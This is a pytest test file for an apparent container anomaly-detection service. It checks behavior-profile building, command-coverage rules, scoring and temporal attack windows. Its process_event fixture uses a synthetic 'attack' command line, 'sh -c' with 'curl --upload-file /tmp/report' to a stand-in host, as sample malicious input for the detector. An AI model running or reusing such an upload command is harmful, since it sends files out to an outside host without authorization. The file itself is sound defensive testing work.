from __future__ import annotations

from copy import deepcopy
from datetime import datetime, timedelta, timezone
from types import SimpleNamespace

import pytest

from porygon_api.baseline import (
    COMMAND_LINEAGE_SCHEMA,
    SUPPORT_AWARE_SCHEMA,
    build_profile_document,
    validate_support_aware_bounds,
)
from porygon_api.command_shapes import command_shape_coverage
from porygon_api.profile_lifecycle import BenignInterval, CandidateIn
from porygon_api.schemas import AnomalyScoreComputeIn, BehaviorProfileBuildIn
from porygon_api.scoring import get_scoring_config, score_feature_documents
from porygon_api.scoring_support import _js_components

START = datetime(2026, 11, 1, tzinfo=timezone.utc)
DIGEST = "example/support-aware@sha256:" + "a" * 64


def process_event(index: int, second: int, *, attack: bool = False, parent: str | None = None):
    return SimpleNamespace(
        event_id=f"process-{index}",
        occurred_at=START + timedelta(seconds=second),
        container_id="c" * 64,
        docker_host_id="host-a",
        sensor_instance_id="sensor-a",
        parent_event_id=parent,
        process_name="sh" if attack else "python",
        executable="/bin/sh" if attack else "/usr/bin/python",
        parent_name="python",
        parent_executable="/usr/bin/python",
        user_uid=1000,
        command_line=(
            "sh -c 'curl --upload-file /tmp/report https://example.invalid/upload'"
            if attack
            else "python --version"
        ),
    )


def feature_document(events, *, end_second: int = 60, temporal: bool = False):
    return build_profile_document(
        image_digest=DIGEST,
        start_at=START,
        end_at=START + timedelta(seconds=end_second),
        window_seconds=60,
        process_events=events,
        runtime_events=[],
        minimum_process_events=0,
        minimum_nonempty_windows=0,
        feature_schema_version=SUPPORT_AWARE_SCHEMA,
        include_temporal_windows=temporal,
    )


def training_events(count=30):
    events = []
    for index in range(count):
        events.append(process_event(index, index + 1, parent=events[-1].event_id if events else None))
    return events


def test_new_contract_has_support_counts_usable_coverage_and_bounded_temporal_windows():
    baseline, quality, manifest, _ = feature_document(training_events())
    observed, _, observed_manifest, _ = feature_document(training_events(), temporal=True)

    assert baseline["schema_version"] == SUPPORT_AWARE_SCHEMA
    assert baseline["feature_support"]["process_event_count"] == 30
    assert baseline["feature_support"]["families"]["executable"]["contributing_event_count"] == 30
    assert baseline["observation_coverage"]["command_usable_events"] == 30
    assert baseline["observation_coverage"]["command_usable_fraction"] == 1.0
    assert baseline["temporal_windows"] == []
    assert len(observed["temporal_windows"]) <= 4
    assert observed_manifest["feature_document_sha256"] != manifest.get("feature_document_sha256")
    assert quality["passed"]


def test_small_fallback_population_does_not_count_as_usable_command_coverage():
    events = training_events()
    for event in events[:7]:
        event.command_line = 'sh -c "unterminated'
    features, quality, _, _ = feature_document(events)

    assert features["observation_coverage"]["command_fallback_events"] == 7
    assert features["observation_coverage"]["command_usable_events"] == 23
    assert features["observation_coverage"]["command_usable_fraction"] == pytest.approx(23 / 30)
    assert not quality["checks"]["usable_command_coverage"]["passed"]
    score = score_feature_documents(baseline_features=features, observation_features=features)
    assert score[0] is None
    assert score[2]["status"] == "insufficient_data"
    assert "observation_usable_command_coverage_below_minimum" in score[2]["reason_codes"]


def test_aggregate_padding_does_not_erase_supported_short_attack_window():
    baseline, _, _, _ = feature_document(training_events())
    attack_events = [
        process_event(100 + index, index + 1, attack=True, parent=f"process-{99 + index}")
        for index in range(3)
    ]
    short, _, _, _ = feature_document(attack_events, end_second=15, temporal=True)
    # Keep benign traffic in later short windows, with deterministic ancestry.
    padded_events = attack_events[:]
    previous = attack_events[-1].event_id
    for index in range(27):
        item = process_event(200 + index, index + 16, parent=previous)
        padded_events.append(item)
        previous = item.event_id
    padded, _, _, _ = feature_document(padded_events, temporal=True)

    short_score = score_feature_documents(baseline_features=baseline, observation_features=short)
    padded_score = score_feature_documents(baseline_features=baseline, observation_features=padded)
    assert short_score[2]["temporal"]["status"] == "supported"
    assert padded_score[2]["temporal"]["status"] == "supported"
    assert padded_score[2]["aggregate_score"] < short_score[2]["aggregate_score"]
    assert padded_score[2]["temporal"]["peak_score"] == short_score[2]["temporal"]["peak_score"]
    assert padded_score[0] == max(
        padded_score[2]["aggregate_score"], padded_score[2]["temporal"]["peak_score"]
    )
    assert padded_score[2]["temporal"]["uncalibrated_maximum"] is True


def test_sparse_profile_support_abstains_instead_of_claiming_baseline_like():
    sparse, _, _, _ = feature_document(training_events(10))
    adequate, _, _, _ = feature_document(training_events(30))
    result = score_feature_documents(baseline_features=sparse, observation_features=adequate)

    assert result[0] is None
    assert result[1] == "insufficient_data"
    assert "baseline_process_support_below_minimum" in result[2]["reason_codes"]


def test_support_aware_profile_rejects_giant_sparse_interval_before_window_allocation():
    with pytest.raises(ValueError, match="duration exceeds its bounded contract"):
        validate_support_aware_bounds(
            START,
            START + timedelta(days=3650),
            5,
        )
    with pytest.raises(ValueError, match="window count exceeds its bounded contract"):
        validate_support_aware_bounds(
            START,
            START + timedelta(days=1),
            5,
        )
    with pytest.raises(ValueError, match="event count exceeds its bounded contract"):
        validate_support_aware_bounds(
            START,
            START + timedelta(seconds=10),
            5,
            process_event_count=100001,
        )


def test_support_aware_counts_reject_negative_or_tampered_mass():
    baseline, _, _, _ = feature_document(training_events())
    observed = deepcopy(baseline)
    observed["categorical_counts"]["executable"]["/usr/bin/python"] = -1

    with pytest.raises(ValueError, match="non-negative integers"):
        score_feature_documents(baseline_features=baseline, observation_features=observed)

    for invalid in (float("nan"), True):
        malformed = deepcopy(baseline)
        malformed["categorical_counts"]["executable"]["/usr/bin/python"] = invalid
        with pytest.raises(ValueError):
            score_feature_documents(baseline_features=baseline, observation_features=malformed)


def test_count_aware_js_is_bounded_symmetric_and_zero_for_identity():
    left = {"a": 8, "b": 2}
    right = {"c": 10}
    identity, _ = _js_components(left, left, alpha=0.5, max_support=128)
    forward, _ = _js_components(left, right, alpha=0.5, max_support=128)
    reverse, _ = _js_components(right, left, alpha=0.5, max_support=128)

    assert identity == 0.0
    scaled_identity, _ = _js_components(
        {"a": 100, "b": 100}, {"a": 5, "b": 5}, alpha=0.5, max_support=128
    )
    assert scaled_identity == 0.0
    assert 0.0 < forward <= 1.0
    assert forward == reverse


def test_count_aware_js_pools_only_unretained_tail_and_preserves_all_mass():
    left = {f"base-{index}": index + 1 for index in range(12)}
    right = {f"observed-{index}": index + 2 for index in range(12)}
    _, details = _js_components(left, right, alpha=0.5, max_support=4)

    # The per-token explanation is capped at 12 rows; the tail bucket is retained
    # among the four selected categories and probability mass remains normalized.
    assert len(details) <= 12
    assert any(row["token"] == "other (bounded tail)" for row in details)
    assert sum(row["baseline_probability"] for row in details) == pytest.approx(1.0)
    assert sum(row["observed_probability"] for row in details) == pytest.approx(1.0)


def test_support_aware_temporal_output_is_invariant_to_input_order():
    events = training_events()
    ordered = feature_document(events, temporal=True)[0]
    reversed_events = feature_document(list(reversed(events)), temporal=True)[0]

    assert ordered["temporal_windows"] == reversed_events["temporal_windows"]
    assert ordered["categorical_counts"] == reversed_events["categorical_counts"]


def test_managed_candidate_defaults_to_new_contract_but_can_select_legacy():
    interval = BenignInterval(
        name="training",
        label="benign",
        start_at=START,
        end_at=START + timedelta(seconds=60),
    )
    assert CandidateIn(
        intervals=[interval], reference="managed profile"
    ).feature_schema_version == SUPPORT_AWARE_SCHEMA
    assert (
        CandidateIn(
            intervals=[interval],
            reference="legacy managed profile",
            feature_schema_version=COMMAND_LINEAGE_SCHEMA,
        ).feature_schema_version
        == COMMAND_LINEAGE_SCHEMA
    )


def test_direct_api_schema_and_algorithm_choices_include_support_aware():
    profile = BehaviorProfileBuildIn(
        feature_schema_version=SUPPORT_AWARE_SCHEMA,
        image_digest=DIGEST,
        training_start=START,
        training_end=START + timedelta(minutes=10),
        approved_by="operator",
    )
    score = AnomalyScoreComputeIn(
        image_digest=DIGEST,
        window_start=START + timedelta(minutes=12),
        algorithm_version="porygon.distance.support-aware",
    )

    assert profile.feature_schema_version == SUPPORT_AWARE_SCHEMA
    assert score.algorithm_version == "porygon.distance.support-aware"


def test_oov_syntax_classes_are_distinct_without_returning_argument_values():
    first = "unlisted-tool --secretvalue alpha-one"
    substituted = "unlisted-tool --othersecret beta-two"
    structurally_distinct = "unlisted-tool --othersecret=beta-two"
    first_shapes, state = command_shape_coverage(first)
    substituted_shapes, second_state = command_shape_coverage(substituted)
    distinct_shapes, distinct_state = command_shape_coverage(structurally_distinct)

    assert state == second_state == distinct_state == "usable"
    assert first_shapes == substituted_shapes
    assert first_shapes != distinct_shapes
    assert first_shapes["syntax:oov-program"] == 1
    assert any(key.startswith("syntax:oov-option:") for key in first_shapes)
    assert "alpha-one" not in repr(first_shapes)
    assert "beta-two" not in repr(substituted_shapes)
    assert "beta-two" not in repr(distinct_shapes)
    assert command_shape_coverage('sh -c "unfinished')[1] == "fallback"


def test_historical_schemas_and_scoring_algorithms_remain_explicit():
    assert COMMAND_LINEAGE_SCHEMA != SUPPORT_AWARE_SCHEMA
    assert get_scoring_config(COMMAND_LINEAGE_SCHEMA)["algorithm_version"] == "porygon.distance.command-lineage"
    config = get_scoring_config(SUPPORT_AWARE_SCHEMA)
    assert config["algorithm_version"] == "porygon.distance.support-aware"
    assert config["temporal_aggregation"] == "maximum-supported-subwindow-and-aggregate"
    assert config["smoothing_policy"] == "fixed-total-common-minimum-support-mixture"
    assert config["feature_extractor_contract"]["windows_are_independent_runs"] is False
